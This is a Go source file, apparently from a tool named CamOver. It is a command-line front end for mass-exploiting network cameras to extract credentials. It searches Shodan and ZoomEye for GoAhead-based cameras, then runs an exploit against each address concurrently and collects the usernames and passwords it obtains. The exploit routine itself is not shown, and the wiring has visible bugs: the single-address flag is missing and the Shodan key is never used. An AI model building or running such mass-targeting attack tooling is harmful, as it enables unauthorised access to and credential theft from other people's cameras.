package camover

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/seaung/camover-go/pkg/logger"
	"github.com/urfave/cli/v2"
)

type CamOverCLI struct {
	CamOver    CamOver
	Logger     logger.Logger
	threads    bool
	output     string
	input      string
	address    string
	shodanKey  string
	zoomeyeKey string
	pages      int
	delay      time.Duration
}

type Matches struct {
	IP   string `json:"ip_str"`
	Port int    `json:"port"`
}

type ShodanResponse struct {
	Matches []Matches `json:"matches"`
}

type ZoomeyeResponse struct {
	Matches []struct {
		IP   string `json:"ip"`
		Port struct {
			Port int `json:"port"`
		} `json:"portinfo"`
	} `json:"matches"`
}

func Start() {
    app := &cli.App{
        Name: "CamOver",
        Usage: "A camera exploit tool to extract credentials.",
        Commands: []*cli.Command{
            initCommandOptions(),
        },
    }
    if err := app.Run(os.Args); err != nil {
        fmt.Println(err)
    }
}

func initCommandOptions() *cli.Command {
	return &cli.Command{
		Name:  "exploit",
		Usage: "Exploit vulnerabilities in network cameras.",
		Flags: []cli.Flag{
			&cli.BoolFlag{
				Name:  "threads",
				Usage: "Use threads for faster processing.",
			},
			&cli.StringFlag{
				Name:  "output",
				Usage: "Output file to save results.",
			},
			&cli.StringFlag{
				Name:  "input",
				Usage: "Input file with list of addresses.",
			},
			&cli.StringFlag{
				Name:  "shodan",
				Usage: "Shodan API Key.",
			},
			&cli.StringFlag{
				Name:  "zoomeye",
				Usage: "Zoomeye API Key.",
			},
			&cli.IntFlag{
				Name:  "pages",
				Usage: "Number of Zoomeye pages to fetch.",
				Value: 100,
			},
			&cli.DurationFlag{
				Name:  "delay",
				Usage: "Delay between threads",
				Value: 100 * time.Millisecond,
			},
		},
		Action: func(ctx *cli.Context) error {
			cli := &CamOverCLI{
				threads:    ctx.Bool("threads"),
				output:     ctx.String("output"),
				input:      ctx.String("input"),
				address:    ctx.String("address"),
				shodanKey:  ctx.String("shodan"),
				zoomeyeKey: ctx.String("zoomeye"),
				pages:      ctx.Int("pages"),
				delay:      ctx.Duration("delay"),
			}
			return cli.run()
		},
	}
}

func (c *CamOverCLI) run() error {
    if c.address != "" {
        c.Logger.Info(fmt.Sprintf("Processing single address : %s\n", c.address))
        c.processAddresses([]string{c.address})
    } else if c.input != "" {
        file, err := os.Open(c.input)
        if err != nil {
            return fmt.Errorf("failed to open input file: %v", err)
        }

        defer file.Close()

        var addresses []string

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            addresses = append(addresses, scanner.Text())
        }

        if err := scanner.Err(); err != nil {
            return fmt.Errorf("failed to read input file : %v\n", err)
        }
        c.processAddresses(addresses)
    } else if c.shodanKey != "" {
        addresses := c.fetchShodanAddress()
        c.processAddresses(addresses)
    } else if c.zoomeyeKey != "" {
        addresses := c.fetchZoomEyeAddresses()
        c.processAddresses(addresses)
    } else {
        c.Logger.Warning("No valid input provided. Use --help for options.")
    }

	return nil
}

func (c *CamOverCLI) processAddress(address string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	username, password, err := c.CamOver.Exploit(address)
	if err != nil {
		c.Logger.Errorw(fmt.Sprintf("[%s] - Error : - %s", address, err))
		return
	}

	c.Logger.Info(fmt.Sprintf("Found : [%s]", address))

	result := fmt.Sprintf("[%s] - %s:%s", address, username, password)

	results <- result
}

func (c *CamOverCLI) processAddresses(addresses []string) {
	var wg sync.WaitGroup

	results := make(chan string, len(addresses))

	for _, address := range addresses {
		wg.Add(1)
		go c.processAddress(address, &wg, results)
		time.Sleep(c.delay)
	}

	wg.Wait()
	close(results)
}

func (c *CamOverCLI) fetchShodanAddress() []string {
	url := fmt.Sprint("https://api.shodan.io/shodan/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41")
	resp, err := http.Get(url)
	if err != nil {
		c.Logger.Warning(fmt.Sprintf("Error fetching Shodan data: %s", err.Error()))
		return nil
	}
	defer resp.Body.Close()

	var shodanResp ShodanResponse

	if err := json.NewDecoder(resp.Body).Decode(&shodanResp); err != nil {
		c.Logger.Errorw(fmt.Sprintf("Error parseing Shodan response : %s", err.Error()))
		return nil
	}

	addresses := []string{}

	for _, match := range shodanResp.Matches {
		addresses = append(addresses, fmt.Sprintf("%s:%d", match.IP, match.Port))
	}

	return addresses
}

func (c *CamOverCLI) fetchZoomEyeAddresses() []string {
    url := fmt.Sprintf("https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page=1")
    req, err := http.NewRequest(http.MethodGet, url, nil)
    if err != nil {
        return nil
    }

    req.Header.Set("Authorization", fmt.Sprintf("JWT %s", c.zoomeyeKey))

    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return nil
    }

    defer resp.Body.Close()

    var zoomeyeResp ZoomeyeResponse

    if err := json.NewDecoder(resp.Body).Decode(&zoomeyeResp); err != nil {
        return nil
    }

    addresses := []string{}

    for _, match := range zoomeyeResp.Matches {
        addresses = append(addresses, fmt.Sprintf("%s:%d", match.IP, match.Port.Port))
    }

    return addresses
}
